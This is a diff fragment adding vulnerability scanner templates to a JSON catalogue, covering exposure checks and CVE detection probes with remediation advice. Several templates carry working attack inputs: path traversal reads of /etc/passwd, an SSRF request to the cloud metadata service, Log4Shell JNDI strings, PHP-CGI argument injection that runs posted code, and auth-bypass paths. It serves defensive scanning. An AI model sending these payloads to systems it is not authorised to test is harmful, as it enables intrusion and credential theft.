+    "rawYaml": "id: spring-boot-actuator-leak\ninfo:\n  name: \"Spring Boot Actuator Endpoints Unauthenticated Exposure\"\n  author: devsecops-auditor\n  severity: high\n  description: \"Detects exposed Spring Boot Actuator endpoints (/actuator, /actuator/env, /actuator/heapdump, /actuator/beans) leaking environment credentials and memory structures.\"\n  reference:\n    - https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html\n  tags: spring,actuator,java,high,owasp\n  classification:\n    cvss-score: 7.5\n    cwe-id: CWE-200\n    owasp-category: A05:2021-Security Misconfiguration\n  remediation: \"Configure management.endpoints.web.exposure.include=health,info and require Spring Security authentication for sensitive endpoints.\"\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/actuator\"\n      - \"{{BaseURL}}/actuator/env\"\n      - \"{{BaseURL}}/actuator/mappings\"\n      - \"{{BaseURL}}/actuator/beans\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"_links\"\n          - \"propertySources\"\n          - \"contexts\"\n          - \"actuator\"\n        condition: or\n"
+  },
+  {
+    "id": "phpmyadmin-panel-exposure",
+    "name": "Public phpMyAdmin Database Administration Panel",
+    "severity": "medium",
+    "description": "Detects publicly accessible phpMyAdmin database management portal, exposing the database server to brute-force attacks.",
+    "tags": [
+      "phpmyadmin",
+      "db",
+      "mysql",
+      "exposure",
+      "owasp"
+    ],
+    "author": "devsecops-auditor",
+    "remediation": "Restrict phpMyAdmin access to internal VPN or whitelist trusted administrative IP addresses in web server config.",
+    "references": [
+      "https://www.phpmyadmin.net/"
+    ],
+    "cvssScore": 5.3,
+    "cweId": "CWE-200",
+    "owaspCategory": "A01:2021-Broken Access Control",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: phpmyadmin-panel-exposure\ninfo:\n  name: \"Public phpMyAdmin Database Administration Panel\"\n  author: devsecops-auditor\n  severity: medium\n  description: \"Detects publicly accessible phpMyAdmin database management portal, exposing the database server to brute-force attacks.\"\n  reference:\n    - https://www.phpmyadmin.net/\n  tags: phpmyadmin,db,mysql,exposure,owasp\n  classification:\n    cvss-score: 5.3\n    cwe-id: CWE-200\n    owasp-category: A01:2021-Broken Access Control\n  remediation: \"Restrict phpMyAdmin access to internal VPN or whitelist trusted administrative IP addresses in web server config.\"\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/phpmyadmin/\"\n      - \"{{BaseURL}}/pma/\"\n      - \"{{BaseURL}}/phpMyAdmin/\"\n      - \"{{BaseURL}}/mysql/\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"phpMyAdmin\"\n          - \"pma_username\"\n          - \"phpmyadmin.net\"\n        condition: or\n"
+  },
+  {
+    "id": "laravel-debug-mode-leak",
+    "name": "Laravel APP_DEBUG Mode Enabled",
+    "severity": "high",
+    "description": "Detects Laravel application with APP_DEBUG=true showing Ignition or Whoops error pages leaking database passwords, APP_KEY, and full stack traces.",
+    "tags": [
+      "laravel",
+      "php",
+      "debug",
+      "secrets",
+      "owasp"
+    ],
+    "author": "devsecops-auditor",
+    "remediation": "Set APP_DEBUG=false in production .env configuration.",
+    "references": [
+      "https://laravel.com/docs/configuration#environment-configuration"
+    ],
+    "cvssScore": 7.5,
+    "cweId": "CWE-200",
+    "owaspCategory": "A05:2021-Security Misconfiguration",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: laravel-debug-mode-leak\ninfo:\n  name: \"Laravel APP_DEBUG Mode Enabled\"\n  author: devsecops-auditor\n  severity: high\n  description: \"Detects Laravel application with APP_DEBUG=true showing Ignition or Whoops error pages leaking database passwords, APP_KEY, and full stack traces.\"\n  reference:\n    - https://laravel.com/docs/configuration#environment-configuration\n  tags: laravel,php,debug,secrets,owasp\n  classification:\n    cvss-score: 7.5\n    cwe-id: CWE-200\n    owasp-category: A05:2021-Security Misconfiguration\n  remediation: \"Set APP_DEBUG=false in production .env configuration.\"\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/_ignition/health-check\"\n      - \"{{BaseURL}}/?probe_trigger_error_404_test=1\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n          - 500\n      - type: word\n        part: body\n        words:\n          - \"Ignition\"\n          - \"laravel_session\"\n          - \"Environment & details\"\n          - \"APP_KEY\"\n        condition: or\n"
+  },
+  {
+    "id": "graphql-introspection-enabled",
+    "name": "GraphQL Introspection Query Enabled",
+    "severity": "medium",
+    "description": "Verifies if production GraphQL endpoints leak full backend data structure and types via public schema introspection queries.",
+    "tags": [
+      "owasp-api",
+      "graphql",
+      "recon",
+      "information-disclosure"
+    ],
+    "author": "devsecops-auditor",
+    "remediation": "Disable GraphQL Schema Introspection in production environments.\nIn Apollo Server: introspection: process.env.NODE_ENV !== 'production'\nIn GraphQL Yoga: useDisableIntrospection() plugin",
+    "references": [
+      "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL"
+    ],
+    "cvssScore": 5.3,
+    "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cweId": "CWE-200",
+    "owaspCategory": "A05:2021-Security Misconfiguration",
+    "enabled": true,
+    "isBuiltin": false,
+    "rawYaml": "id: graphql-introspection-enabled\ninfo:\n  name: GraphQL Introspection Query Enabled\n  author: devsecops-auditor\n  severity: medium\n  description: Verifies if production GraphQL endpoints leak full backend data structure and types via public schema introspection queries.\n  reference:\n    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL\n  tags: owasp-api,graphql,recon,information-disclosure\n  classification:\n    cvss-score: 5.3\n    cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\n    cwe-id: CWE-200\n    owasp-category: A05:2021-Security Misconfiguration\n  remediation: |\n    Disable GraphQL Schema Introspection in production environments.\n    In Apollo Server: introspection: process.env.NODE_ENV !== 'production'\n    In GraphQL Yoga: useDisableIntrospection() plugin\n\nrequests:\n  - method: POST\n    path:\n      - \"{{BaseURL}}/graphql\"\n      - \"{{BaseURL}}/api/graphql\"\n    headers:\n      Content-Type: application/json\n    body: '{\"query\": \"{ __schema { types { name } } }\"}'\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"__schema\"\n          - \"types\"\n"
+  },
+  {
+    "id": "api-debug-endpoints",
+    "name": "Exposed Interactive API Documentation / Actuator Probe",
+    "severity": "low",
+    "description": "Checks if interactive OpenAPI/Swagger UI or Spring Boot Actuator health/metric endpoints are exposed without authentication.",
+    "tags": [
+      "owasp-api",
+      "swagger",
+      "exposure",
+      "defense"
+    ],
+    "author": "devsecops-auditor",
+    "remediation": "Restrict public access to Swagger UI, OpenAPI JSON documentation, and Actuator health/metric endpoints using authentication middleware or internal network firewall rules.",
+    "references": [
+      "https://owasp.org/www-project-api-security/"
+    ],
+    "cvssScore": 3.1,
+    "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cweId": "CWE-200",
+    "owaspCategory": "A05:2021-Security Misconfiguration",
+    "enabled": true,
+    "isBuiltin": false,
+    "rawYaml": "id: api-debug-endpoints\ninfo:\n  name: Exposed Interactive API Documentation / Actuator Probe\n  author: devsecops-auditor\n  severity: low\n  description: Checks if interactive OpenAPI/Swagger UI or Spring Boot Actuator health/metric endpoints are exposed without authentication.\n  reference:\n    - https://owasp.org/www-project-api-security/\n  tags: owasp-api,swagger,exposure,defense\n  classification:\n    cvss-score: 3.1\n    cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\n    cwe-id: CWE-200\n    owasp-category: A05:2021-Security Misconfiguration\n  remediation: |\n    Restrict public access to Swagger UI, OpenAPI JSON documentation, and Actuator health/metric endpoints using authentication middleware or internal network firewall rules.\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/v2/api-docs\"\n      - \"{{BaseURL}}/v3/api-docs\"\n      - \"{{BaseURL}}/swagger-ui/index.html\"\n      - \"{{BaseURL}}/swagger-ui.html\"\n      - \"{{BaseURL}}/actuator/health\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - '\"swagger\":\"2.0\"'\n          - '\"openapi\":\"3.'\n          - 'id=\"swagger-ui\"'\n          - 'swagger-ui-bundle.js'\n          - '{\"status\":\"UP\"'\n          - '\"_links\":{\"self\":'\n        condition: or\n"
+  },
+  {
+    "id": "ssrf-cloud-metadata-probe",
+    "name": "Cloud Instance Metadata Service (IMDS) Exposure",
+    "severity": "critical",
+    "description": "Tests if proxy parameters or URL handlers forward queries to internal cloud metadata addresses (AWS/GCP/Azure 169.254.169.254).",
+    "tags": [
+      "burp-active",
+      "ssrf",
+      "cloud",
+      "critical"
+    ],
+    "author": "devsecops-auditor",
+    "remediation": "1. Enforce strict outbound URL validation against private, loopback, and link-local IP blocks (RFC 1918, RFC 3927).\n2. Enforce IMDSv2 (Session token requirement) with hop limit = 1 on AWS EC2 instances.\n3. Disable unnecessary proxy forwarding endpoints or require strong API key authentication.",
+    "references": [
+      "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
+      "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html"
+    ],
+    "cvssScore": 9.8,
+    "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
+    "cweId": "CWE-918",
+    "owaspCategory": "A10:2021-Server-Side Request Forgery (SSRF)",
+    "enabled": true,
+    "isBuiltin": false,
+    "rawYaml": "id: ssrf-cloud-metadata-probe\ninfo:\n  name: Cloud Instance Metadata Service (IMDS) Exposure\n  author: devsecops-auditor\n  severity: critical\n  description: Tests if proxy parameters or URL handlers forward queries to internal cloud metadata addresses (AWS/GCP/Azure 169.254.169.254).\n  reference:\n    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\n    - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html\n  tags: burp-active,ssrf,cloud,critical\n  classification:\n    cvss-score: 9.8\n    cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N\n    cwe-id: CWE-918\n    owasp-category: A10:2021-Server-Side Request Forgery (SSRF)\n  remediation: |\n    1. Enforce strict outbound URL validation against private, loopback, and link-local IP blocks (RFC 1918, RFC 3927).\n    2. Enforce IMDSv2 (Session token requirement) with hop limit = 1 on AWS EC2 instances.\n    3. Disable unnecessary proxy forwarding endpoints or require strong API key authentication.\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/\"\n      - \"{{BaseURL}}/proxy?target=http://169.254.169.254/latest/meta-data/\"\n    matchers-condition: or\n    matchers:\n      - type: word\n        part: body\n        words:\n          - \"ami-id\"\n          - \"instance-id\"\n          - \"security-credentials\"\n"
+  },
+  {
+    "id": "directory-traversal-canary",
+    "name": "Directory Traversal & Path Manipulation Canary",
+    "severity": "high",
+    "description": "Probes for Local File Inclusion (LFI) and path traversal using safe POSIX /etc/passwd patterns in URL parameters.",
+    "tags": [
+      "burp-active",
+      "lfi",
+      "traversal",
+      "high"
+    ],
+    "author": "devsecops-auditor",
+    "remediation": "1. Use path normalization with path.resolve() and verify the resolved path starts with the allowed base directory.\n2. Avoid passing raw user input directly to filesystem APIs (fs.readFile, open).\n3. Use an indirect map (IDs or keys) instead of actual file path parameters.",
+    "references": [
+      "https://owasp.org/www-community/attacks/Path_Traversal"
+    ],
+    "cvssScore": 7.5,
+    "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cweId": "CWE-22",
+    "owaspCategory": "A01:2021-Broken Access Control",
+    "enabled": true,
+    "isBuiltin": false,
+    "rawYaml": "id: directory-traversal-canary\ninfo:\n  name: Directory Traversal & Path Manipulation Canary\n  author: devsecops-auditor\n  severity: high\n  description: Probes for Local File Inclusion (LFI) and path traversal using safe POSIX /etc/passwd patterns in URL parameters.\n  reference:\n    - https://owasp.org/www-community/attacks/Path_Traversal\n  tags: burp-active,lfi,traversal,high\n  classification:\n    cvss-score: 7.5\n    cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\n    cwe-id: CWE-22\n    owasp-category: A01:2021-Broken Access Control\n  remediation: |\n    1. Use path normalization with path.resolve() and verify the resolved path starts with the allowed base directory.\n    2. Avoid passing raw user input directly to filesystem APIs (fs.readFile, open).\n    3. Use an indirect map (IDs or keys) instead of actual file path parameters.\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/?file=../../../../etc/passwd\"\n      - \"{{BaseURL}}/?page=../../../../etc/passwd\"\n      - \"{{BaseURL}}/?path=../../../../etc/passwd\"\n      - \"{{BaseURL}}/?doc=../../../../etc/passwd\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"root:x:0:0:\"\n          - \"daemon:\"\n          - \"bin/bash\"\n          - \"bin/sh\"\n        condition: or\n"
+  },
+  {
+    "id": "subdomain-takeover-signatures",
+    "name": "Dangling CNAME Cloud Service Fingerprint",
+    "severity": "high",
+    "description": "Checks for known provider error fingerprints indicating the target CNAME points to an unclaimed cloud resource.",
+    "tags": [
+      "takeover",
+      "dns",
+      "subfinder",
+      "recon"
+    ],
+    "author": "devsecops-auditor",
+    "remediation": "1. Delete dangling CNAME records from DNS zone files immediately when decommissioning cloud services.\n2. Claim or reclaim the associated cloud resource name (AWS S3 bucket, GitHub Pages repo, Heroku app) before modifying DNS.",
+    "references": [
+      "https://github.com/EdOverflow/can-i-take-over-xyz"
+    ],
+    "cvssScore": 8.2,
+    "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "cweId": "CWE-284",
+    "owaspCategory": "A05:2021-Security Misconfiguration",
+    "enabled": true,
+    "isBuiltin": false,
+    "rawYaml": "id: subdomain-takeover-signatures\ninfo:\n  name: Dangling CNAME Cloud Service Fingerprint\n  author: devsecops-auditor\n  severity: high\n  description: Checks for known provider error fingerprints indicating the target CNAME points to an unclaimed cloud resource.\n  reference:\n    - https://github.com/EdOverflow/can-i-take-over-xyz\n  tags: takeover,dns,subfinder,recon\n  classification:\n    cvss-score: 8.2\n    cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N\n    cwe-id: CWE-284\n    owasp-category: A05:2021-Security Misconfiguration\n  remediation: |\n    1. Delete dangling CNAME records from DNS zone files immediately when decommissioning cloud services.\n    2. Claim or reclaim the associated cloud resource name (AWS S3 bucket, GitHub Pages repo, Heroku app) before modifying DNS.\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/\"\n    matchers-condition: or\n    matchers:\n      - type: word\n        part: body\n        words:\n          - \"There isn't a GitHub Pages site here\"\n          - \"NoSuchBucket\"\n          - \"The specified bucket does not exist\"\n          - \"No such app\"\n          - \"herokucdn.com\"\n          - \"project not found\"\n          - \"Fastly error: unknown domain\"\n"
+  },
+  {
+    "id": "cve-2021-44228-log4shell",
+    "name": "Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
+    "severity": "critical",
+    "description": "Detects Log4j JNDI injection vulnerability via header parameter probes.",
+    "tags": [
+      "cve",
+      "cve-2021",
+      "log4j",
+      "rce",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "remediation": "Upgrade Log4j to 2.17.1 or newer or set formatMsgNoLookups=true.",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+      "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
+    ],
+    "cvssScore": 10,
+    "cweId": "CWE-502",
+    "owaspCategory": "A03:2021-Injection",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2021-44228-log4shell\ninfo:\n  name: \"Apache Log4j2 JNDI Remote Code Execution (Log4Shell)\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Detects Log4j JNDI injection vulnerability via header parameter probes.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228\n    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog\n  tags: cve,cve-2021,log4j,rce,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 10.0\n    cwe-id: CWE-502\n    owasp-category: A03:2021-Injection\n  remediation: \"Upgrade Log4j to 2.17.1 or newer or set formatMsgNoLookups=true.\"\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/?x=${jndi:ldap://127.0.0.1:1389/a}\"\n    headers:\n      User-Agent: \"${jndi:ldap://127.0.0.1:1389/a}\"\n      X-Api-Version: \"${jndi:ldap://127.0.0.1:1389/a}\"\n      X-Forwarded-For: \"${jndi:ldap://127.0.0.1:1389/a}\"\n    matchers-condition: or\n    matchers:\n      - type: word\n        part: body\n        words:\n          - \"Error looking up JNDI resource\"\n          - \"javax.naming.NamingException\"\n          - \"org.apache.logging.log4j\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2024-4577-php-cgi",
+    "name": "PHP-CGI Windows Best-Fit Argument Injection (CVE-2024-4577)",
+    "severity": "critical",
+    "description": "Probes for PHP-CGI Windows argument injection by requesting phpinfo with custom ini directives.",
+    "tags": [
+      "cve",
+      "cve-2024",
+      "php",
+      "cgi",
+      "rce",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "remediation": "Upgrade PHP to patched versions or migrate from CGI to PHP-FPM.",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-4577",
+      "https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection/"
+    ],
+    "cvssScore": 9.8,
+    "cweId": "CWE-88",
+    "owaspCategory": "A03:2021-Injection",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2024-4577-php-cgi\ninfo:\n  name: \"PHP-CGI Windows Best-Fit Argument Injection (CVE-2024-4577)\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Probes for PHP-CGI Windows argument injection by requesting phpinfo with custom ini directives.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2024-4577\n    - https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection/\n  tags: cve,cve-2024,php,cgi,rce,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-88\n    owasp-category: A03:2021-Injection\n  remediation: \"Upgrade PHP to patched versions or migrate from CGI to PHP-FPM.\"\n\nrequests:\n  - method: POST\n    path:\n      - \"{{BaseURL}}/test.php?%ADd+allow_url_include%3don+-d+auto_prepend_file%3dphp://input\"\n      - \"{{BaseURL}}/index.php?%ADd+allow_url_include%3don+-d+auto_prepend_file%3dphp://input\"\n    headers:\n      Content-Type: application/x-www-form-urlencoded\n    body: \"<?php echo 'CVE-2024-4577-VERIFIED-'.phpversion(); ?>\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"CVE-2024-4577-VERIFIED-\"\n          - \"PHP Version\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2021-41773-apache",
+    "name": "Apache HTTP Server 2.4.49 Path Traversal Detection",
+    "severity": "critical",
+    "description": "Verifies vulnerability to CVE-2021-41773 by sending a safe encoded path probe to the icons directory.",
+    "tags": [
+      "cve",
+      "cve-2021",
+      "apache",
+      "traversal",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
+      "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
+    ],
+    "cvssScore": 9.8,
+    "cweId": "CWE-22",
+    "owaspCategory": "A01:2021-Broken Access Control",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2021-41773-apache\ninfo:\n  name: \"Apache HTTP Server 2.4.49 Path Traversal Detection\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Verifies vulnerability to CVE-2021-41773 by sending a safe encoded path probe to the icons directory.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2021-41773\n    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog\n  tags: cve,cve-2021,apache,traversal,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-22\n    owasp-category: A01:2021-Broken Access Control\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\"\n      - \"{{BaseURL}}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"root:x:0:0:\"\n          - \"daemon:x:1:1:\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2024-3400-panos",
+    "name": "Palo Alto PAN-OS GlobalProtect Command Injection Probe",
+    "severity": "critical",
+    "description": "Tests GlobalProtect portal endpoint for PAN-OS SESSID injection.",
+    "tags": [
+      "cve",
+      "cve-2024",
+      "paloalto",
+      "panos",
+      "rce",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-3400"
+    ],
+    "cvssScore": 10,
+    "cweId": "CWE-78",
+    "owaspCategory": "A03:2021-Injection",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2024-3400-panos\ninfo:\n  name: \"Palo Alto PAN-OS GlobalProtect Command Injection Probe\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Tests GlobalProtect portal endpoint for PAN-OS SESSID injection.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2024-3400\n  tags: cve,cve-2024,paloalto,panos,rce,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 10.0\n    cwe-id: CWE-78\n    owasp-category: A03:2021-Injection\n\nrequests:\n  - method: POST\n    path:\n      - \"{{BaseURL}}/ssl-vpn/hipreport.esp\"\n    headers:\n      Cookie: \"SESSID=../../../../opt/panlogs/tmp/device_telemetry/audit_probe;\"\n    body: \"test\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"GlobalProtect\"\n          - \"pan_login\"\n        condition: and\n"
+  },
+  {
+    "id": "cve-2024-27198-teamcity",
+    "name": "JetBrains TeamCity Web Auth Bypass (CVE-2024-27198)",
+    "severity": "critical",
+    "description": "Verifies if TeamCity server metadata can be read without authentication via URL path traversal bypass.",
+    "tags": [
+      "cve",
+      "cve-2024",
+      "teamcity",
+      "jetbrains",
+      "auth-bypass",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-27198"
+    ],
+    "cvssScore": 9.8,
+    "cweId": "CWE-288",
+    "owaspCategory": "A07:2021-Identification and Authentication Failures",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2024-27198-teamcity\ninfo:\n  name: \"JetBrains TeamCity Web Auth Bypass (CVE-2024-27198)\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Verifies if TeamCity server metadata can be read without authentication via URL path traversal bypass.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2024-27198\n  tags: cve,cve-2024,teamcity,jetbrains,auth-bypass,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-288\n    owasp-category: A07:2021-Identification and Authentication Failures\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/httpAuth?jsp=/app/rest/server\"\n      - \"{{BaseURL}}/?jsp=/app/rest/server/version\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"<server\"\n          - \"TeamCity\"\n          - \"buildNumber=\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2024-1709-screenconnect",
+    "name": "ConnectWise ScreenConnect SetupWizard Auth Bypass (CVE-2024-1709)",
+    "severity": "critical",
+    "description": "Checks if SetupWizard.aspx/ endpoint is accessible on deployed instances.",
+    "tags": [
+      "cve",
+      "cve-2024",
+      "screenconnect",
+      "auth-bypass",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-1709"
+    ],
+    "cvssScore": 10,
+    "cweId": "CWE-287",
+    "owaspCategory": "A07:2021-Identification and Authentication Failures",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2024-1709-screenconnect\ninfo:\n  name: \"ConnectWise ScreenConnect SetupWizard Auth Bypass (CVE-2024-1709)\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Checks if SetupWizard.aspx/ endpoint is accessible on deployed instances.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2024-1709\n  tags: cve,cve-2024,screenconnect,auth-bypass,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 10.0\n    cwe-id: CWE-287\n    owasp-category: A07:2021-Identification and Authentication Failures\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/SetupWizard.aspx/\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"ScreenConnect\"\n          - \"Setup Wizard\"\n          - \"Create Administrative Account\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2023-34362-moveit",
+    "name": "Progress MOVEit Transfer Human.aspx Exposure Probe",
+    "severity": "critical",
+    "description": "Checks MOVEit Transfer login and API headers.",
+    "tags": [
+      "cve",
+      "cve-2023",
+      "moveit",
+      "sqli",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-34362"
+    ],
+    "cvssScore": 9.8,
+    "cweId": "CWE-89",
+    "owaspCategory": "A03:2021-Injection",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2023-34362-moveit\ninfo:\n  name: \"Progress MOVEit Transfer Human.aspx Exposure Probe\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Checks MOVEit Transfer login and API headers.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2023-34362\n  tags: cve,cve-2023,moveit,sqli,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-89\n    owasp-category: A03:2021-Injection\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/human.aspx\"\n      - \"{{BaseURL}}/api/v1/token\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n          - 400\n      - type: word\n        part: body\n        words:\n          - \"MOVEit Transfer\"\n          - \"X-MOVEit-CustomHeader\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2021-43798-grafana",
+    "name": "Grafana Directory Traversal Verification",
+    "severity": "high",
+    "description": "Checks for CVE-2021-43798 in Grafana via standard plugin endpoints.",
+    "tags": [
+      "cve",
+      "cve-2021",
+      "grafana",
+      "traversal",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-43798"
+    ],
+    "cvssScore": 8.6,
+    "cweId": "CWE-22",
+    "owaspCategory": "A01:2021-Broken Access Control",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2021-43798-grafana\ninfo:\n  name: \"Grafana Directory Traversal Verification\"\n  author: devsecops-cve-intel\n  severity: high\n  description: \"Checks for CVE-2021-43798 in Grafana via standard plugin endpoints.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2021-43798\n  tags: cve,cve-2021,grafana,traversal,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 8.6\n    cwe-id: CWE-22\n    owasp-category: A01:2021-Broken Access Control\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/public/plugins/alertlist/../../../../../../../../etc/passwd\"\n      - \"{{BaseURL}}/public/plugins/grafana-clock-panel/../../../../../../../../etc/passwd\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"root:x:0:0:\"\n          - \"daemon:\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2022-26134-confluence",
+    "name": "Atlassian Confluence OGNL Safe Evaluation Probe",
+    "severity": "critical",
+    "description": "Tests for CVE-2022-26134 using safe benign header reflection.",
+    "tags": [
+      "cve",
+      "cve-2022",
+      "confluence",
+      "atlassian",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2022-26134"
+    ],
+    "cvssScore": 9.8,
+    "cweId": "CWE-94",
+    "owaspCategory": "A03:2021-Injection",
+    "enabled": true,
+    "isBuiltin": true,
